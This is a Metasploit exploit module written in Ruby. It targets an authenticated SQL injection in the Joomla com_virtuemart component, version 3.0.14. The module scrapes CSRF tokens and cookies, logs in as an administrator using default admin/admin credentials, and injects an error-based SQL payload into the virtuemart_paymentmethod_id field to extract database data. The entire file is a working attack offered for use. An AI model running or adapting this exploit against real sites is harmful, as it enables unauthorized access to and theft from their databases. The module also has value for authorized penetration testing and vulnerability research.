##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
      'Name'           => "SQL Injection for authorized com_virtuemart users",
      'Description'    => %q{
         Multiple SQL injection bugs found during blackbox testing of version 3.0.14.
         Module created as a part of grabash.py (see 'References' for more details).
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'code16' # Metasploit module
        ],
      'References'     =>
        [
           [ 'URL', 'http://code610.blogspot.com' ]
        ],
      'Platform'       => ['php'],
      'Arch'           => ARCH_PHP,
      'Targets'        =>
        [
          [ 'Joomla 3.x', {} ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => "20.08.2016",
      'DefaultTarget'  => 0))

      register_options(
        [
                  OptString.new('USERNAME', [true, 'The base path to Joomla', 'admin']),
                  OptString.new('PASSWORD', [true, 'The base path to Joomla', 'admin']),
                  OptString.new('TARGETURI', [true, 'The base path to Joomla', '/joomla2'])
        ], self.class)
  end # of initialize()


  def check
  end



  # grab token from resp.page
  def grabToken(astring)
    if astring  =~ /([0-9a-fA-F]{32})/
      return $1
    end
    return nil
  end

  def exploit
    first_req = send_request_cgi({ # get cookie and token
        'method'        => 'GET',
        'uri'           => normalize_uri(target_uri.path, 'administrator', 'index.php')
        }
    )

    # get token
    token_pattern = /(<input type=\"hidden\" name=\"[a-zA-Z0-9]*\" value=\"1\")/
    if first_req.body =~ token_pattern
      token = grabToken(first_req.body)
      print_good("Got token : " + token.to_s)
    else
      print_fail("Can not find token :/")
    end

    # get cookie
    gotCookies = first_req['set-cookie']
    cookies = first_req.get_cookies.sub(/HttpOnly/, "")
    print_good("Got cookie : " + cookies)



    # Log in as admin; if resp.code = 303, you will be redirected to admins panel
    adminme = send_request_cgi({
        'method'        => 'POST',
        'uri'           => normalize_uri(target_uri.path, 'administrator', 'index.php'),
        'cookie'        => cookies,
        'vars_post'     => {
                'username'      => datastore['USERNAME'],
                'passwd'        => datastore['PASSWORD'],
                'option'        =>  'com_login',
                'task'          => 'login',
                token.to_s      => 1,
                'return'        => 'aW5kZXgucGhwP29wdGlvbj1jb21fdGVtcGxhdGVzJnZpZXc9dGVtcGxhdGUmaWQ9NTAzJmZpbGU9TDJWeWNtOXlMbkJvY0ElM0QlM0Q%3D'
        },
        token.to_s      => 1
    })

    if adminme.code == 303
      print_good("Welcome admin ;) Your code is: " + adminme.code.to_s)
    end

    # Grab token
    if adminme && adminme.code == 303 && adminme.headers['Location']
      location = adminme.headers['Location']
      print_good("We found a good location :)")
      res = send_request_cgi(
        'uri'    => location,
        'method' => 'GET',
        'cookie' => cookies
      )

      # Retrieving template token
      if res && res.code == 200 && res.body =~ /&amp;([a-z0-9]+)=1\">/
        token = $1
#        print_status("#{peer} - Token [ #{token} ] retrieved")
      else
        fail_with(Failure::Unknown, "#{peer} - Retrieving token failed")
      end
    end

    payload = "AAAA AND (SELECT 2212 FROM(SELECT COUNT(*),CONCAT(0x717a6b7071,(SELECT (ELT(2212=2212,version()))),0x7178717171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"

    # Last request; inject payload data into file
    print_status("#{peer} - SQL Injection bug in virtuemart_paymentmethod_id")
    res = send_request_cgi({
      'method'   => 'POST',
      'uri'      => normalize_uri(target_uri.path, "administrator", "index.php"),
      'cookie'  => cookies,
      'vars_post' => {
        'payment_name'  =>      'asdasd',
        'slug'      =>      'asasd', # btw also vulnerable
        'published'      =>      '0',
        'payment_desc'      =>      'asdasd',
        'virtuemart_shoppergroup_id[]'      =>      '1',
        'ordering'      =>      '',
        'option'      =>      'com_virtuemart',
        'virtuemart_paymentmethod_id'      =>      payload,
        'task'      =>      'apply',
        'boxchecked'      =>      '0',
        'xxcontroller'      =>      'paymentmethod',
        'view'      =>      'paymentmethod',
        token      =>      '1'
      },
      token => '1'
      })
    if res && res.body =~ /Duplicate entry/
      print_status("Code after final request: " + res.code.to_s)

      print_good("Everything is good, see results of SQLi:")
    end

    res.body.each_line do |line|
    if line.match('Duplicate entry')
      weNeed = line.match('qzkpq(.*?)qxqqq')[1]
      print_good("Data: " + weNeed.to_s)
    end
  end
  print_status("Finished.")

  end # of expl
end # of file
